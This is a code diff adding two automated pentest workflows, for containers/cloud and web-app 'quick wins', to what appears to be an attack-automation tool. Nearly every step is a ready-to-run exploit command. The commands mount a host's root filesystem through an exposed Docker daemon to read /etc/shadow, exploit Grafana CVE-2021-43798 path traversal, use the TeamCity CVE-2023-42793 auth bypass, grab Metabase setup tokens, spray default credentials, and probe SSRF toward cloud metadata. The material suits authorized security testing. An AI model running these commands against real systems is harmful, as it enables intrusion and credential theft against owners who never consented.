@@ -479,6 +479,94 @@ WORKFLOWS = [
             },
         ],
     },
+    {
+        "id": "container_cloud",
+        "name": "Container / Cloud Pentest",
+        "description": "Docker daemon, K8s API, Grafana, ActiveMQ, Jupyter, Spring Boot actuator — infraestructura moderna.",
+        "icon": "fa-cloud",
+        "color": "cyan",
+        "auto_inject": True,
+        "steps": [
+            {
+                "name": "Docker Daemon No-TLS (2375)",
+                "command": "docker -H tcp://{rhost}:2375 info 2>/dev/null | head -10; docker -H tcp://{rhost}:2375 run --rm -v /:/mnt alpine sh -c 'echo DOCKER_DAEMON_EXPOSED; id; cat /mnt/etc/shadow 2>/dev/null | head -5; cat /mnt/root/root.txt 2>/dev/null' 2>/dev/null | head -20",
+                "parse": "exploit_result",
+            },
+            {
+                "name": "Kubernetes API Anonymous Access (6443)",
+                "command": "curl -sk https://{rhost}:6443/api/v1/namespaces 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(n[\"metadata\"][\"name\"]) for n in d.get(\"items\",[])]' 2>/dev/null; kubectl --server=https://{rhost}:6443 --insecure-skip-tls-verify auth can-i --list 2>/dev/null | head -10",
+                "parse": "exploit_result",
+            },
+            {
+                "name": "Grafana Default Creds + CVE-2021-43798",
+                "command": "curl -s -u admin:admin http://{rhost}:3000/api/org 2>/dev/null | grep -q '\"id\"' && echo GRAFANA_DEFAULT_CREDS_VALID; for p in alertlist cloudwatch; do curl -sk --path-as-is \"http://{rhost}:3000/public/plugins/$p/../../../../../../../../../etc/passwd\" 2>/dev/null | grep -q 'root:' && echo GRAFANA_CVE_2021_43798_CONFIRMED && break; done; curl -sk --path-as-is \"http://{rhost}:3000/public/plugins/alertlist/../../../../../../../../../etc/grafana/grafana.ini\" 2>/dev/null | grep -E 'admin_password|secret_key' | head -5",
+                "parse": "exploit_result",
+            },
+            {
+                "name": "Apache ActiveMQ CVE-2023-46604 (8161/61616)",
+                "command": "curl -su admin:admin http://{rhost}:8161/api/jolokia/version 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(\"ACTIVEMQ_DEFAULT_CREDS\" if d.get(\"value\") else \"\")' 2>/dev/null; nmap -p 61616 --script banner {rhost} 2>/dev/null",
+                "parse": "exploit_result",
+            },
+            {
+                "name": "Jupyter Notebook No-Auth RCE (8888)",
+                "command": "STATUS=$(curl -s --max-time 8 -o /dev/null -w '%{http_code}' http://{rhost}:8888/api/kernelspecs 2>/dev/null); [ \"$STATUS\" = '200' ] && echo JUPYTER_NO_AUTH && curl -s -X POST http://{rhost}:8888/api/kernels -H 'Content-Type: application/json' -d '{\"name\":\"python3\"}' 2>/dev/null | python3 -c 'import sys,json; k=json.load(sys.stdin); print(\"KERNEL_CREATED:\",k.get(\"id\",\"\"))' 2>/dev/null",
+                "parse": "exploit_result",
+            },
+            {
+                "name": "Spring Boot Actuator Secrets (/actuator/env)",
+                "command": "for ep in actuator/env actuator/heapdump actuator/health actuator/mappings actuator/beans; do CODE=$(curl -sk -o /dev/null -w '%{http_code}' http://{rhost}/$ep 2>/dev/null); [ \"$CODE\" = '200' ] && echo \"ACTUATOR_EXPOSED: $ep\" && curl -sk http://{rhost}/$ep 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(k,str(v)[:80]) for k,v in d.items() if any(s in k.lower() for s in [\"pass\",\"secret\",\"key\",\"token\",\"db\"])]' 2>/dev/null | head -5; done",
+                "parse": "exploit_result",
+            },
+            {
+                "name": "TeamCity CVE-2023-42793 Auth Bypass (8111)",
+                "command": "TOKEN=$(curl -s -X POST http://{rhost}:8111/app/rest/users/id:1/tokens/RPC2 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d.get(\"value\",\"\"))' 2>/dev/null); [ -n \"$TOKEN\" ] && echo \"TEAMCITY_AUTH_BYPASS TOKEN=$TOKEN\"",
+                "parse": "exploit_result",
+            },
+            {
+                "name": "Metabase Pre-Auth RCE CVE-2023-38646 (3000)",
+                "command": "TOKEN=$(curl -s http://{rhost}:3000/api/session/properties 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); t=d.get(\"setup-token\",\"\"); print(t) if t else print(\"no_token\")' 2>/dev/null); [ \"$TOKEN\" != 'no_token' ] && [ -n \"$TOKEN\" ] && echo \"METABASE_SETUP_TOKEN: $TOKEN\"",
+                "parse": "exploit_result",
+            },
+        ],
+    },
+    {
+        "id": "webapp_quick_win",
+        "name": "Web App Quick Wins",
+        "description": "Comprueba rápidamente los vectores de mayor impacto en apps web: .env, .git, actuator, GraphQL, admin panels.",
+        "icon": "fa-bolt",
+        "color": "lime",
+        "auto_inject": True,
+        "steps": [
+            {
+                "name": "Sensitive Files Discovery (.env, .git, backup)",
+                "command": "for f in /.env /.git/HEAD /backup.zip /db.sql /config.php /wp-config.php /phpinfo.php /actuator/env /api/swagger.json /graphql; do CODE=$(curl -sk -o /dev/null -w '%{http_code}' http://{rhost}$f 2>/dev/null); [ \"$CODE\" = '200' ] && echo \"BACKUP_FILE_FOUND:$f (HTTP $CODE)\"; done",
+                "parse": "nmap",
+            },
+            {
+                "name": "Default Admin Credentials Spray",
+                "command": "for url in http://{rhost} https://{rhost} http://{rhost}:8080 http://{rhost}:3000; do for cred in admin:admin admin:password admin:123456 root:root admin: tomcat:tomcat; do u=${cred%%:*}; p=${cred##*:}; CODE=$(curl -sk -u \"$u:$p\" -o /dev/null -w '%{http_code}' \"$url/api/v1/users\" 2>/dev/null); [ \"$CODE\" = '200' ] && echo \"DEFAULT_CREDS: $u:$p @ $url\"; done; done 2>/dev/null | head -5",
+            },
+            {
+                "name": "GraphQL Introspection + Schema",
+                "command": "for path in /graphql /api/graphql /v1/graphql /graphiql; do R=$(curl -sk --max-time 8 -X POST http://{rhost}$path -H 'Content-Type: application/json' -d '{\"query\":\"{ __schema { types { name } } }\"}' 2>/dev/null); echo \"$R\" | grep -q 'types' && echo \"GRAPHQL_INTROSPECTION_ENABLED: $path\" && echo \"$R\" | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(t[\"name\"]) for t in d.get(\"data\",{}).get(\"__schema\",{}).get(\"types\",[]) if not t[\"name\"].startswith(\"__\")][:8]' 2>/dev/null && break; done",
+                "parse": "exploit_result",
+            },
+            {
+                "name": "SSRF - Cloud Metadata Probe",
+                "command": "for param in url redirect next fetch proxy; do R=$(curl -sk --max-time 5 \"http://{rhost}/?$param=http://169.254.169.254/latest/meta-data/\" 2>/dev/null | head -3); [ -n \"$R\" ] && echo \"SSRF_CONFIRMED: ?$param=http://169.254.169.254\" && echo \"$R\" && break; done",
+                "parse": "exploit_result",
+            },
+            {
+                "name": "CORS Misconfiguration Check",
+                "command": "for url in http://{rhost} https://{rhost}; do LOC=$(curl -sk -H 'Origin: https://evil.com' -I \"$url/\" 2>/dev/null | grep -i 'access-control-allow-origin'); [ -n \"$LOC\" ] && echo \"CORS: $LOC\"; done",
+            },
+            {
+                "name": "JWT Token Discovery + Weak Secret",
+                "command": "TOKEN=$(curl -sk http://{rhost}/api/login -X POST -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"admin\"}' 2>/dev/null | grep -oP 'eyJ[a-zA-Z0-9._-]{30,}'); [ -n \"$TOKEN\" ] && echo \"JWT_FOUND: ${TOKEN:0:80}...\"; echo \"$TOKEN\" | cut -d'.' -f1 | base64 -d 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d)' 2>/dev/null",
+                "parse": "exploit_result",
+            },
+        ],
+    },
 ]
 
 # ── Auth ───────────────────────────────────────────────────────────────────
